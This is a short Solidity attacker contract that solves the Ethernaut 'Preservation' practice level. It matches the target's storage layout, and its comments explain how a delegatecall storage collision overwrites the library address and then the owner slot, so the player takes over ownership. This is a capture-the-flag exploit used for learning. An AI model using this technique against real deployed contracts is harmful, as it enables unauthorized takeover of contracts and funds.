//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract EthernautLevel16 {
    address public filler1; //2 filler slots for variables so we can access owner at slot3.
    address public filler2;
    address public owner;

    //Overwrite the owner storage slot.
    function setTime(uint256 _placeholder) external {
        owner = 0xC7005fe8AF6ca11FcC0092D3C4C5C3D883eCE16c;
    }

    //Get address of malicious contract in uint256 and pass to setTime
    //It will change the value of storage in original preservation contract at storage of index 0 which was
    //the address of timeZone1Library initially. It then overwrites this storage slot with our
    //malicious contract address and we can now do as we please.
    //The owner variable is stored in the 3rd slot so we can make a new call to setFirstTime which is now our
    //malicious block of code and we can have it overwrite the storage slot of owner with an address of our own
    //hence completing the level.
    function checkConversion(address _player) external pure returns (uint256) {
        return uint256(_player);
    }
}
